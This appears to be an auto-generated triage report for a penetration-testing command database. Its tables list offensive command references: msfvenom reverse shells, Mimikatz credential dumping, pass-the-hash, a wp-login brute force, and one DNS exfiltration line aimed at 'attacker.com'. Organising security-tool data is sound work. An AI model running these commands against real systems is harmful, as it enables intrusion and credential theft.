# Failed Mappings Triage Report

**Phase 2C.2 - Context-Dependent Items Analysis**

**Date:** 2025-11-09
**Analyst:** Automated Categorization Script

---

## Executive Summary

After creating 204 new commands in Phase 2B, we improved mapping success from 59.5% → 66.6%, but **295 failed mappings** remain across **245 unique text values**.

**Automated categorization has identified:**

- **33 Quick-Win items** (64 occurrences) - Already exist in index, just need ID updates → **+19.7% mapping success**
- **111 Non-Command items** (127 occurrences) - Should be removed (instructions, state conditions) → Reduce noise
- **66 Command candidates** (68 occurrences) - Legitimate commands to create
- **35 Manual review items** (36 occurrences) - Need human context

**Estimated Impact:**
- Current: 66.6% (588/883 mappings)
- After Quick-Wins + Removals: 86.2% (652/756 mappings)
- Gain: **+19.7%**

---

## Category Breakdown

### Category A: Already Exists (Quick Fix) - 11 items, 42 occurrences

**Description:** Commands exist in index but weren't matched due to fuzzy matching limitations.

**Action:** Update text to exact command ID.

**Priority:** HIGH

| Text | Match | Score | Count | Files |
|------|-------|-------|-------|-------|
| `Import PowerView` | `import-powerview` | 1.0 | 30 | ad-powerview-core.json, ad-powerview-permissions.json |
| `burp intruder` | `burp-intruder` | 1.0 | 2 | web/general.json, web/wordpress.json |
| `PowerView imported` | `verify-powerview-imported` | 0.9 | 2 | ad-powerview-core.json |
| `nessus scan` | `nessus-scan` | 1.0 | 1 | recon.json |
| `bitsadmin download` | `bitsadmin-download` | 1.0 | 1 | file-transfer.json |
| `Import SharpHound data` | `import-sharphound` | 0.9 | 1 | post-exploitation-additions.json |
| `PowerUp's Get-ModifiableServiceFile` | `get-modifiableservicefile` | 0.9 | 1 | windows.json |
| `docker-mount-escape (simpler)` | `docker-mount-escape` | 0.75 | 1 | linux-docker-commands.json |
| `tail-follow-log /var/log/syslog` | `tail-follow-log` | 0.75 | 1 | log-monitoring.json |
| `msfvenom -p windows/meterpreter/reverse_tcp` | `windows/meterpreter/reverse_tcp` | 0.9 | 1 | exploitation/general.json |
| `curl http://<TARGET>:<PORT> - HTTP service verification` | `curl-http-service-verification` | 0.8 | 1 | verification.json |

**Impact:** 42 occurrences fixed

---

### Category D: Fuzzy Match (Update) - 22 items, 22 occurrences

**Description:** Text is close to existing command, needs exact ID update.

**Action:** Review match, update to exact command ID if correct.

**Priority:** MEDIUM

| Text | Match | Score | Confidence |
|------|-------|-------|------------|
| `Get-GPPPassword (PowerSploit)` | `get-gpppassword` | 0.67 | Medium |
| `PowerUp's Get-UnquotedService` | `get-unquotedservice` | 0.67 | Medium |
| `Rubeus ptt /ticket:<FILE>` | `rubeus-ptt` | 0.67 | Medium |
| `msfconsole search scanner/<SERVICE>` | `msfconsole-search` | 0.67 | Medium |
| `wpscan-enumerate-all (to discover usernames)` | `wpscan-enumerate-all` | 0.5 | Low |
| `dmesg-kernel-messages (kernel only)` | `dmesg-kernel-messages` | 0.6 | Medium |
| `docker-mount-escape (preferred method)` | `docker-mount-escape` | 0.6 | Medium |
| `sqli-union-mysql-info (if SQL injection available)` | `sqli-union-mysql-info` | 0.5 | Low |
| `postgres-direct-connect (with password inline)` | `postgres-direct-connect` | 0.5 | Low |
| `sqli-union-postgresql-info (if SQL injection available)` | `sqli-union-postgresql-info` | 0.5 | Low |
| `msfvenom -p linux/x86/shell_reverse_tcp` | `msfvenom-linux-reverse-tcp` | 0.5 | Low |
| `msfvenom -p windows/shell_reverse_tcp` | `msfvenom-linux-reverse-tcp` | 0.5 | Low |
| `pth-impacket-psexec per target` | `pth-impacket-psexec` | 0.6 | Medium |
| `psexec-impacket-shell for direct SYSTEM shell` | `psexec-impacket-shell` | 0.5 | Low |
| `dcom-shellwindows (similar technique)` | `dcom-shellwindows` | 0.5 | Low |
| `psexec-impacket-shell with -hashes` | `psexec-impacket-shell` | 0.6 | Medium |
| `overpass-mimikatz-pth already executed` | `overpass-mimikatz-pth` | 0.6 | Medium |
| `service ssh start - SysVinit alternative (older systems)` | `service-ssh-start-sysvinit` | 0.57 | Medium |
| `nmap localhost - External port scan verification` | `nmap-localhost-verification` | 0.5 | Low |
| `netstat -rn - Netstat routing table view` | `netstat-routing-table` | 0.6 | Medium |
| `chisel - HTTP tunneling if SSH blocked` | `chisel-http-tunneling` | 0.5 | Low |
| `plink-remote-forward - Windows SSH client alternative` | `plink-remote-forward-windows` | 0.57 | Medium |

**Impact:** 22 occurrences fixed (review first)

---

### Category C: Not a Command (Remove) - 111 items, 127 occurrences

**Description:** Instruction text, state conditions, notes that should be removed from relationship arrays.

**Action:** Remove from `alternatives` and `prerequisites` arrays.

**Priority:** MEDIUM

**Sample items:**

| Text | Reason | Count |
|------|--------|-------|
| `Neo4j running` | State condition | 2 |
| `Mimikatz on Windows host` | State condition | 2 |
| `Transfer script` | Instruction | 1 |
| `Transfer PrivescCheck.ps1` | Instruction | 1 |
| `Get-CimInstance win32_process` | PS instruction | 1 |
| `Get-ScheduledTask` | PS instruction | 1 |
| `Get-Process -Id <PID> | Select *` | PS instruction | 1 |
| `# Install ClamAV on Windows test system:...` | Comment | 1 |
| `Use /dev/tcp for raw download` | Instruction | 1 |
| `Use -k for self-signed certificates` | Instruction | 1 |
| `Run directly: \\<LHOST>\share\file.exe` | Instruction | 1 |
| `Use base64 encoding for text-safe transfer` | Instruction | 1 |
| `Manual check with: sc qc <servicename>` | Instruction | 1 |
| `Check /etc/sudoers if readable` | Instruction | 1 |
| `Find exploit first: searchsploit <SERVICE>` | Instruction | 1 |
| `CrackMapExec installed` | State condition | 1 |
| `Evil-WinRM installed on Kali` | State condition | 1 |
| `Impacket installed on Kali` | State condition | 1 |
| `WinRM enabled on target (port 5985/5986)` | State condition | 1 |
| `SMB port 445 open` | State condition | 1 |

**Full list:** 111 items (see FAILED_MAPPINGS_CATEGORIZED.json)

**Impact:** Remove 127 noise items, reduce total mappings to 756

---

### Category B: Create Simple Command - 66 items, 68 occurrences

**Description:** Clear executable commands that should be created.

**Action:** Create minimal command definitions.

**Priority:** LOW-MEDIUM (case by case)

**Sample items:**

| Text | Type | Complexity | Priority |
|------|------|------------|----------|
| `chmod +x` | Shell | Trivial | Medium |
| `docker info` | Shell | Trivial | Low |
| `docker version` | Shell | Trivial | Low |
| `docker pull alpine (if no images available)` | Shell | Simple | Low |
| `docker pull ubuntu (larger but more tools)` | Shell | Simple | Low |
| `docker pull busybox (even smaller than alpine)` | Shell | Simple | Low |
| `python3 smbserver.py share .` | Shell | Simple | Medium |
| `bitsadmin for newer Windows` | Note | N/A | Remove |
| `certutil base64 encoding` | Shell | Simple | Low |
| `dig $data.attacker.com` | Shell | Simple | Low |
| `wfuzz -z file,<WORDLIST> --hc 200 -d 'log=admin&pwd=FUZZ' <URL>/wp-login.php` | Shell | Complex | Medium |
| `journalctl -k (kernel messages via journald)` | Shell | Simple | Low |
| `journalctl -kf (kernel messages via journald)` | Shell | Simple | Low |
| `lsof +d <DIRECTORY> (non-recursive, faster)` | Shell | Simple | Low |
| `at (command-line AT utility)` | Shell | Simple | Low |
| `grep time range in syslog files (manual)` | Note | N/A | Remove |
| `w (includes user info)` | Shell | Trivial | Low |
| `ls -l /proc/*/fd/ (manual check)` | Shell | Simple | Low |
| `python requests.post()` | Python | N/A | Remove |
| `burp suite XML-RPC plugin` | Tool reference | N/A | Remove |

**Analysis:**
- Some items are actual commands worth creating (e.g., `chmod +x`, `docker info`)
- Some are notes/alternatives that should be removed or rephrased
- Need case-by-case review

**Recommendation:** Review each item, create commands for legitimate ones, reclassify others as Category C.

---

### Category E: Manual Review - 35 items, 36 occurrences

**Description:** Ambiguous items needing human context to determine proper action.

**Action:** Manual review with source file context.

**Priority:** LOW

**Sample items:**

| Text | Likely Category | Suggested Action |
|------|----------------|------------------|
| `HTTP server on attacker` | State/Instruction | Remove (state condition) |
| `Transfer LinEnum.sh` | Instruction | Remove (generic instruction) |
| `Transfer pspy64/pspy32` | Instruction | Remove (generic instruction) |
| `Transfer PowerUp.ps1` | Instruction | Remove (generic instruction) |
| `Transfer Seatbelt.exe` | Instruction | Remove (generic instruction) |
| `SFTP for interactive transfer` | Alternative | Consider creating `sftp-interactive` |
| `Python Flask upload server` | Alternative | Consider creating `flask-upload-server` |
| `TFTP for simpler transfers` | Alternative | Consider creating `tftp-transfer` |
| `SFTP for encrypted transfers` | Alternative | Consider creating `sftp-encrypted` |
| `PowerUp's Get-RegistryAlwaysInstallElevated` | Command | Create `get-registryalwaysinstallelevated` |
| `Watson (PowerShell-based)` | Tool | Consider creating `watson-scan` |
| `mimikatz: vault::list` | Command | Create `mimikatz-vault-list` |
| `Use mimikatz lsadump::sam` | Instruction+Command | Create `mimikatz-lsadump-sam` |
| `Rubeus.exe kerberoast` | Command | Create `rubeus-kerberoast` |
| `Mimikatz: sekurlsa::tickets` | Command | Create `mimikatz-sekurlsa-tickets` |
| `Mimikatz: kerberos::purge` | Command | Create `mimikatz-kerberos-purge` |
| `Rubeus: klist` | Command | Create `rubeus-klist` |
| `Invoke-Mimikatz for remote export` | Alternative | Update to existing `invoke-mimikatz` |
| `Mimikatz on Windows host` | State | Remove (state condition) |
| `Mimikatz on compromised Windows host` | State | Remove (state condition) |

**Recommendation:** Most are either state conditions (remove) or commands (create). Few truly ambiguous items remain.

---

## Quick-Win Application Plan

### Files with Most Updates (Priority Order)

1. **data/commands/enumeration/ad-powerview-core.json** - 14 updates
   - Mostly "Import PowerView" → `import-powerview`
   - High confidence, automated update safe

2. **data/commands/enumeration/ad-powerview-permissions.json** - 10 updates
   - Similar PowerView imports
   - High confidence

3. **data/commands/enumeration/ad-session-share-enum.json** - 7 updates
   - PowerView verification commands
   - High confidence

4. **data/commands/pivoting/linux-utilities.json** - 4 updates
   - Various fuzzy matches
   - Medium confidence, needs review

5. **data/commands/exploitation/general.json** - 3 updates
   - Mixed confidence
   - Review before applying

**See QUICK_WIN_UPDATES.json for complete file-by-file breakdown.**

---

## Recommended Action Plan

### Phase 1: Quick Wins (Immediate) - +19.7% mapping success

1. **Apply High-Confidence Updates** (39 items)
   - Category A items with score ≥ 0.9
   - Automated safe, can be scripted
   - **Impact:** +39 successful mappings

2. **Review Medium-Confidence Updates** (13 items)
   - Category A items with score < 0.9
   - Category D items with score ≥ 0.6
   - Manual verification recommended
   - **Impact:** +13 successful mappings (if verified)

3. **Skip Low-Confidence Updates** (12 items)
   - Category D items with score < 0.6
   - Defer to manual review
   - **Impact:** TBD after review

**Total Quick-Win Impact:** 52 mappings → 73.5% success rate

### Phase 2: Cleanup (Medium Priority)

1. **Remove Category C Items** (127 occurrences)
   - Instructions, state conditions, notes
   - Reduces noise, improves data quality
   - **Impact:** Total mappings: 883 → 756

**Combined Impact After Phase 1+2:** 86.2% success rate (652/756)

### Phase 3: Create Missing Commands (Lower Priority)

1. **Category E - High-Value Commands** (~20 items)
   - Mimikatz subcommands
   - Rubeus variations
   - Tool-specific commands
   - **Impact:** +20 mappings → ~88% success

2. **Category B - Selective Creation** (~20 items)
   - Only create truly useful commands
   - Skip trivial/redundant ones
   - **Impact:** +20 mappings → ~90% success

### Phase 4: Final Manual Review (Lowest Priority)

1. **Remaining Category E Items** (~15 items)
   - Edge cases
   - Ambiguous references
   - Context-dependent decisions

**Estimated Final Success Rate:** 90-95%

---

## Automation Opportunities

### High-Confidence Auto-Update Script

Create script to apply Category A updates with score ≥ 0.9:

```python
# Pseudo-code
for file_update in quick_win_updates:
    for update in file_update["updates"]:
        if update["confidence"] == "high":
            # Load JSON
            # Find command by ID
            # Replace old_text with new_id in field
            # Save JSON
```

**Risk:** Low (exact matches, high scores)
**Benefit:** Immediate +39 mappings

### Category C Removal Script

Create script to remove non-command items:

```python
# Pseudo-code
for item in category_c_items:
    for occurrence in item["occurrences"]:
        # Load JSON
        # Find command by ID
        # Remove old_text from field array
        # Save JSON
```

**Risk:** Low (clearly not commands)
**Benefit:** Cleaner data, reduced noise

---

## Estimated Final Outcome

| Metric | Current | After Quick-Wins | After All Phases |
|--------|---------|------------------|------------------|
| Total Text References | 883 | 756 | 756 |
| Successful Mappings | 588 | 652 | ~680-700 |
| Failed Mappings | 295 | 104 | ~50-70 |
| Success Rate | 66.6% | 86.2% | 90-95% |

---

## Files Generated

1. **FAILED_MAPPINGS_CATEGORIZED.json** - Full categorization data
2. **QUICK_WIN_UPDATES.json** - File-by-file update plan
3. **FAILED_MAPPINGS_TRIAGE.md** (this file) - Human-readable summary

---

## Next Steps

1. Review this triage report
2. Decide on automation approach:
   - Option A: Fully automated (high-risk, fast)
   - Option B: Semi-automated (review medium-confidence, apply high-confidence) - RECOMMENDED
   - Option C: Fully manual (low-risk, slow)
3. Execute Phase 1 (Quick Wins)
4. Re-run mapping script to verify improvement
5. Proceed to Phase 2 (Cleanup)
6. Assess remaining work for Phases 3-4

---

**Report Generated:** 2025-11-09
**Scripts Used:**
- `/home/kali/Desktop/OSCP/crack/db/neo4j-migration/scripts/utils/categorize_failed_mappings.py`
- `/home/kali/Desktop/OSCP/crack/db/neo4j-migration/scripts/utils/generate_quick_wins.py`
